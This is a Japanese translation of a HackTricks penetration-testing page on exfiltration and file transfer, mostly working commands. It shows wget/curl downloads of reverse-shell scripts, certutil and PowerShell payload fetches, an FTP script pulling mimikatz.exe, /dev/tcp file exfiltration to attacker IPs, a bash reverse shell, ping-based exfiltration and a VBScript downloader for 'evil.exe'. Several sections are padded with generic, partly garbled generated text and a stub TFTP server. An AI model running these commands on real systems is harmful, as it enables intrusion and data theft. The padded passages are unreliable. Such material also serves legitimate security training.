# 情報の外部流出

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 情報を外部に流出させるための一般的にホワイトリストに登録されているドメイン

[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つけてください。

## コピー＆ペースト Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### ファイルのアップロード

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServerでGETとPOSTを表示する（ヘッダーも）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Pythonモジュール[uploadserver](https://pypi.org/project/uploadserver/)：
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPSサーバー**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure the confidentiality and integrity of the data being transmitted.

To exfiltrate data through an HTTPS server, you can leverage various techniques such as:

- **Covert Channels**: Hide the exfiltrated data within the legitimate HTTPS traffic to avoid detection. This can be done by manipulating the HTTP headers or payload.

- **Steganography**: Conceal the exfiltrated data within the images or other media files being transferred over HTTPS. This technique can be effective in bypassing security measures.

- **DNS Tunneling**: Use DNS requests and responses to transfer the exfiltrated data. By encoding the data within DNS queries or responses, you can bypass firewalls and other network security controls.

- **Out-of-Band (OOB) Exfiltration**: Utilize alternative communication channels, such as email or instant messaging, to send the exfiltrated data. This method can be useful when direct communication with the HTTPS server is not possible.

When exfiltrating data through an HTTPS server, it is important to consider the following factors:

- **Encryption**: Ensure that the data is encrypted using strong cryptographic algorithms to protect it from unauthorized access.

- **Traffic Analysis**: Be aware that sophisticated adversaries may perform traffic analysis to detect exfiltration attempts. Use techniques to obfuscate the exfiltrated data and make it harder to detect.

- **Command and Control (C2)**: Establish a secure and reliable C2 channel to manage the exfiltration process. This can involve setting up a separate server or using existing infrastructure.

By understanding the capabilities and limitations of an HTTPS server, you can effectively exfiltrate data while minimizing the risk of detection.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTPサーバー（Python）

```python
import socket
import os

def send_file(file_path, host, port):
    # ファイルの存在を確認
    if not os.path.exists(file_path):
        print("ファイルが存在しません")
        return

    # ソケットを作成し、接続
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # ファイルを開き、データを送信
    with open(file_path, "rb") as f:
        data = f.read(1024)
        while data:
            s.send(data)
            data = f.read(1024)

    # 接続を閉じる
    s.close()

def main():
    file_path = "/path/to/file"
    host = "ftp.example.com"
    port = 21

    send_file(file_path, host, port)

if __name__ == "__main__":
    main()
```

このPythonスクリプトは、指定されたファイルをFTPサーバーに送信するためのものです。

使用方法：
1. `file_path`変数に送信したいファイルのパスを設定します。
2. `host`変数にFTPサーバーのホスト名を設定します。
3. `port`変数にFTPサーバーのポート番号を設定します。
4. スクリプトを実行します。

注意事項：
- 送信するファイルが存在しない場合、エラーメッセージが表示されます。
- ファイルは1024バイトずつ送信されます。
- 送信が完了すると、接続が閉じられます。
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTPサーバー（NodeJS）

```html
#### FTP server (NodeJS)

The FTP server is a popular method for exfiltrating data from a compromised system. It allows the attacker to transfer files from the victim's machine to their own server.

To set up an FTP server using NodeJS, you can use the `ftp-srv` package. This package provides a simple and easy-to-use FTP server implementation.

Here is an example of how to set up an FTP server using NodeJS:

1. Install the `ftp-srv` package using npm:

```bash
npm install ftp-srv
```

2. Create a new JavaScript file, for example `ftp-server.js`, and require the `ftp-srv` package:

```javascript
const FtpSrv = require('ftp-srv');
```

3. Create a new instance of the `FtpSrv` class and configure it:

```javascript
const ftpServer = new FtpSrv({
  url: 'ftp://0.0.0.0:21',
  pasv_url: 'ftp://0.0.0.0:30000-30009',
  anonymous: true,
  greeting: 'Welcome to the FTP server',
});
```

4. Start the FTP server:

```javascript
ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((err) => {
    console.error('Error starting FTP server:', err);
  });
```

5. The FTP server is now running and ready to accept connections. You can use an FTP client to connect to the server and transfer files.

Note: This is a basic example of setting up an FTP server using NodeJS. You can customize the server configuration and add authentication mechanisms as needed.

#### Exfiltrating data using FTP

Once the FTP server is set up, you can use it to exfiltrate data from the compromised system. Here are the steps to exfiltrate data using FTP:

1. Connect to the FTP server using an FTP client. You can use popular FTP clients like FileZilla or WinSCP.

2. Authenticate to the FTP server if required. In the example above, anonymous authentication is enabled, so no credentials are needed.

3. Navigate to the directory where you want to upload the exfiltrated data.

4. Upload the files from the compromised system to the FTP server. You can use the FTP client's upload functionality to transfer files.

5. Once the files are uploaded, they will be stored on the FTP server, allowing the attacker to access and retrieve them.

Note: It is important to ensure that the FTP server is properly secured to prevent unauthorized access. Additionally, consider encrypting the data before exfiltration to protect its confidentiality.
```
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTPサーバー（pure-ftp）

#### FTPサーバーの概要

FTP（File Transfer Protocol）サーバーは、ファイルの転送とアクセスを可能にするプロトコルです。pure-ftpは、オープンソースのFTPサーバーソフトウェアの一種です。

#### ファイルのエクスフィルトレーション（データの漏洩）

ファイルのエクスフィルトレーションは、攻撃者がネットワークからデータを盗み出すための手法です。pure-ftpサーバーを使用してデータをエクスフィルトレートする方法について説明します。

1. ポートスキャンを実行し、ターゲットのネットワーク内にFTPサーバーが存在するか確認します。

2. FTPクライアントを使用して、ターゲットのFTPサーバーに接続します。

3. ユーザー名とパスワードを入力してログインします。

4. ターゲットのファイルシステムにアクセスし、エクスフィルトレートしたいデータを特定します。

5. エクスフィルトレートしたいデータをFTPサーバーにアップロードします。

6. アップロードが完了したら、FTPサーバーからデータをダウンロードしてローカルマシンに保存します。

#### 注意事項

- エクスフィルトレーションを行う前に、法的および倫理的な制約を確認してください。

- ターゲットのFTPサーバーにアクセスするためには、有効なユーザー名とパスワードが必要です。

- エクスフィルトレートするデータのサイズによっては、アップロードとダウンロードに時間がかかる場合があります。

- エクスフィルトレートしたデータが検出されないようにするために、暗号化やステガノグラフィーなどの技術を使用することができます。

#### 参考リンク

- [pure-ftp公式ウェブサイト](https://www.pureftpd.org/project/pure-ftpd/)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** クライアント

Windowsクライアントは、機密情報を外部に漏洩させる可能性がある脆弱性を持っています。以下は、Windowsクライアントからデータを外部に抽出するための一般的な手法です。

#### ドキュメントのステガノグラフィ

ステガノグラフィは、データを画像や音声ファイルなどの他のファイルに隠す技術です。Windowsクライアントでは、ドキュメントファイルに機密情報を埋め込むことができます。この手法を使用すると、データを外部に送信するために使用される通常の通信チャネルを回避することができます。

#### ネットワークトラフィックの監視

Windowsクライアントは、ネットワークトラフィックを監視することでデータを外部に送信する可能性があります。ネットワークトラフィックの監視には、パケットキャプチャツールやネットワークモニタリングツールを使用することができます。これにより、機密情報が外部に送信される際に通信内容をキャプチャすることができます。

#### リモートアクセスツールの悪用

Windowsクライアントには、リモートアクセスツールがインストールされている場合があります。これらのツールを悪用することで、攻撃者はクライアントからデータを外部に送信することができます。リモートアクセスツールの悪用には、バックドアの設置やリモートコマンド実行などの手法があります。

#### ファイル転送プロトコルの使用

Windowsクライアントでは、ファイル転送プロトコルを使用してデータを外部に送信することができます。一般的なファイル転送プロトコルには、FTPやSFTPなどがあります。これらのプロトコルを使用することで、機密情報を外部のサーバーに送信することができます。

#### クラウドストレージの利用

Windowsクライアントでは、クラウドストレージを利用してデータを外部に送信することができます。一般的なクラウドストレージサービスには、Google DriveやDropboxなどがあります。これらのサービスを使用することで、機密情報をクラウド上にアップロードし、外部に送信することができます。

これらの手法を使用することで、Windowsクライアントからデータを外部に漏洩させることができます。攻撃者はこれらの手法を悪用して、機密情報を盗み出す可能性があります。したがって、Windowsクライアントのセキュリティを強化するためには、これらの脆弱性に対する対策を講じる必要があります。
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## SMB

Kaliをサーバーとして使用する
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
または、**Sambaを使用して**SMB共有を作成します：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation, as it allows the attacker to steal sensitive information from the compromised system.

There are several methods that can be used for exfiltration, depending on the specific scenario and the available resources. Here are some common techniques:

## 1. File Transfer Protocols

File Transfer Protocol (FTP), Secure Copy Protocol (SCP), and Hypertext Transfer Protocol (HTTP) are commonly used protocols for transferring files over a network. Attackers can leverage these protocols to exfiltrate data by uploading it to a remote server or downloading it from the target system.

## 2. Email

Email is another common method for exfiltrating data. Attackers can send sensitive information as attachments or embed it within the body of an email. They can use their own email server or compromise a legitimate email account for this purpose.

## 3. DNS Tunneling

DNS tunneling involves encapsulating data within DNS queries and responses. Attackers can use this technique to bypass firewalls and other security measures that may be in place. The exfiltrated data is typically sent to a DNS server controlled by the attacker.

## 4. Steganography

Steganography is the practice of hiding data within seemingly innocuous files, such as images or documents. Attackers can embed sensitive information within these files and then exfiltrate them without arousing suspicion.

## 5. Cloud Storage

Cloud storage services, such as Dropbox or Google Drive, can be used for exfiltration. Attackers can upload sensitive data to these platforms and then access it from a different location.

## 6. Covert Channels

Covert channels involve using legitimate network protocols or services in unintended ways to exfiltrate data. For example, attackers can use ICMP or DNS packets to transmit data covertly.

It is important for organizations to implement strong security measures to detect and prevent exfiltration attempts. This includes monitoring network traffic, implementing data loss prevention (DLP) solutions, and educating employees about the risks of data exfiltration.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻撃者はSSHdを実行している必要があります。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

もし被害者がSSHを持っている場合、攻撃者は被害者のディレクトリを攻撃者にマウントすることができます。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）は、ネットワーク通信を行うためのユーティリティツールです。NCを使用すると、TCPやUDPソケットを作成し、データの送受信を行うことができます。

### データの送信

NCを使用してデータを送信するには、以下のコマンドを使用します。

```bash
echo "データ" | nc <宛先IP> <ポート番号>
```

例えば、宛先IPが`192.168.1.100`でポート番号が`1234`の場合、以下のようにコマンドを実行します。

```bash
echo "Hello, World!" | nc 192.168.1.100 1234
```

### データの受信

NCを使用してデータを受信するには、以下のコマンドを使用します。

```bash
nc -l -p <ポート番号>
```

例えば、ポート番号が`1234`の場合、以下のようにコマンドを実行します。

```bash
nc -l -p 1234
```

このコマンドを実行すると、指定したポート番号でデータの受信を待機します。

### ファイルの送受信

NCを使用してファイルを送受信するには、以下のコマンドを使用します。

ファイルの送信：

```bash
nc <宛先IP> <ポート番号> < 送信するファイル
```

ファイルの受信：

```bash
nc -l -p <ポート番号> > 受信するファイル
```

例えば、宛先IPが`192.168.1.100`でポート番号が`1234`の場合、以下のようにコマンドを実行します。

ファイルの送信：

```bash
nc 192.168.1.100 1234 < file.txt
```

ファイルの受信：

```bash
nc -l -p 1234 > received_file.txt
```

このようにして、NCを使用してデータやファイルを送受信することができます。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/attacker_ip/attacker_port
```

This method allows you to download a file from the victim machine to your machine. Replace `/path/to/file` with the path of the file you want to download, `attacker_ip` with your IP address, and `attacker_port` with the port number you want to use for the connection.

### Upload file to victim

```bash
cat /path/to/file | nc -l -p victim_port
```

This method allows you to upload a file from your machine to the victim machine. Replace `/path/to/file` with the path of the file you want to upload, and `victim_port` with the port number you want to use for the connection.

### Execute command on victim

```bash
echo -e "GET / HTTP/1.1\r\nHost: attacker_ip\r\n\r\n" > /dev/tcp/victim_ip/victim_port
```

This method allows you to execute a command on the victim machine. Replace `attacker_ip` with your IP address, `victim_ip` with the IP address of the victim machine, and `victim_port` with the port number you want to use for the connection.

### Reverse shell

```bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```

This method allows you to establish a reverse shell connection with the victim machine. Replace `attacker_ip` with your IP address, and `attacker_port` with the port number you want to use for the connection.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### ファイルを被害者にアップロードする

To upload a file to the victim's system, you can use various methods depending on the specific scenario. Here are some common techniques:

1. **Web-based file upload**: If the victim's system has a web application that allows file uploads, you can exploit this functionality to upload your file. Look for vulnerabilities such as unrestricted file types, insufficient file validation, or server-side code execution vulnerabilities.

2. **Email attachments**: Craft a malicious email with an attachment containing your file. Social engineering techniques can be used to trick the victim into opening the email and downloading the attachment.

3. **Malicious documents**: Create a malicious document (e.g., Word, Excel, PDF) that exploits vulnerabilities in the document reader software. When the victim opens the document, the exploit triggers and executes your file.

4. **Remote file inclusion**: If the victim's system includes files from external sources, you can try to exploit this functionality to include your file. Look for vulnerabilities such as path traversal or insecure file inclusion.

5. **Exploiting software vulnerabilities**: Identify and exploit vulnerabilities in software running on the victim's system. This could include vulnerabilities in web servers, FTP servers, or other network services.

Remember to consider the context and limitations of the target system when choosing the appropriate method for file upload.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP（Internet Control Message Protocol）は、ネットワークデバイス間で制御メッセージを交換するために使用されるプロトコルです。ICMPは、ネットワークの状態やエラーの通知、ネットワークデバイスの可用性の確認など、さまざまな目的で使用されます。

ICMPは、データグラムの形式で送信され、IPヘッダーの一部として使用されます。ICMPメッセージは、送信元から宛先に送信され、宛先は応答メッセージを返すことができます。

ICMPは、ネットワークのトラブルシューティングやネットワークデバイスの状態監視など、さまざまな目的で使用されます。また、ICMPを使用して、ネットワークデバイス間で情報をやり取りすることもできます。

ICMPを使用した情報漏洩の手法としては、ICMPトンネリングやICMPエコーリクエスト/エコーリプライメッセージの改ざんなどがあります。これらの手法を使用することで、ネットワークからデータを外部に送信することができます。

ICMPを使用した情報漏洩の手法は、ネットワークのセキュリティを脅かす可能性があるため、注意が必要です。適切なセキュリティ対策を講じることが重要です。
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます。
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

デフォルトではXPと2003（他の場合はインストール時に明示的に追加する必要があります）

Kaliでは、**TFTPサーバーを起動**します：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**PythonでのTFTPサーバー：**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            error_packet = struct.pack('!HH', 5, 4) + b'Invalid opcode'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

tftp_server()
```

このコードはPythonでTFTPサーバーを作成するものです。以下の手順で使用できます：

1. UDPソケットを作成します。
2. ソケットを`0.0.0.0`のポート69にバインドします。
3. クライアントからのデータを受信します。
4. 受信したデータの最初の2バイトを解析して、操作コードを取得します。
5. 操作コードに応じて、読み取りリクエストまたは書き込みリクエストを処理します。
6. 読み取りリクエストの場合、要求されたファイルを処理して送信します。
7. 書き込みリクエストの場合、ファイルを受信して処理します。
8. 操作コードが無効な場合、エラーパケットを送信します。

このTFTPサーバーは、Pythonを使用してTFTPプロトコルを実装するための基本的なスターターコードです。必要に応じて、読み取りリクエストと書き込みリクエストの処理を追加してください。
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**被害者**で、Kaliサーバーに接続します：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHPのワンライナーを使用してファイルをダウンロードします：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）は、Microsoft Windows環境で使用されるスクリプト言語です。VBScriptは、Windowsシステム上でのデータの抽出や操作に使用されることがあります。以下に、VBScriptを使用したデータの外部への抽出方法を示します。

### ファイルの外部への送信

VBScriptを使用して、ファイルを外部の場所に送信することができます。以下のコードは、ファイルをFTPサーバーにアップロードする例です。

```vbscript
Set objFTP = CreateObject("WinSCP.Session")
objFTP.Open "ftp://username:password@ftp.example.com"
objFTP.PutFile "C:\path\to\file.txt", "/remote/path/file.txt"
objFTP.Close
```

このコードでは、WinSCP.Sessionオブジェクトを作成し、FTPサーバーに接続します。その後、PutFileメソッドを使用して、ローカルのファイルをリモートの場所にアップロードします。

### データのエンコードと送信

VBScriptを使用して、データをエンコードして外部に送信することもできます。以下のコードは、Base64エンコードを使用してデータをエンコードし、HTTP POSTリクエストを送信する例です。

```vbscript
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://example.com", False
objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.Send "data=" & EncodeBase64("sensitive data")
response = objHTTP.ResponseText
```

このコードでは、WinHttp.WinHttpRequest.5.1オブジェクトを作成し、POSTメソッドを使用してHTTPリクエストを送信します。データは、EncodeBase64関数を使用してBase64エンコードされます。

### データの暗号化と送信

VBScriptを使用して、データを暗号化して外部に送信することもできます。以下のコードは、AES暗号化を使用してデータを暗号化し、HTTP POSTリクエストを送信する例です。

```vbscript
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://example.com", False
objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.Send "data=" & EncryptAES("sensitive data", "encryption key")
response = objHTTP.ResponseText
```

このコードでは、WinHttp.WinHttpRequest.5.1オブジェクトを作成し、POSTメソッドを使用してHTTPリクエストを送信します。データは、EncryptAES関数を使用してAES暗号化されます。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**被害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

これはWindows 32ビットマシンで動作するクレイジーなテクニックです。アイデアは、`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されますが、16進数から再構築することもできます。したがって、アイデアは、`netcat`のようなバイナリを取り、それを16進数に逆アセンブルして、侵害されたマシン上のファイルに貼り付け、そして`debug.exe`でアセンブルすることです。

`Debug.exe`は64 kbしかアセンブルできません。したがって、それよりも小さいファイルを使用する必要があります。さらに、upxを使用してさらに圧縮することができます。それでは、以下のようにしましょう：
```
upx -9 nc.exe
```
今ではわずか29 kbしかありません。完璧です。さて、それを分解しましょう：
```
wine exe2bat.exe nc.exe nc.txt
```
今、テキストをWindowsシェルにコピーして貼り付けるだけです。それによって、自動的にnc.exeという名前のファイルが作成されます。

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
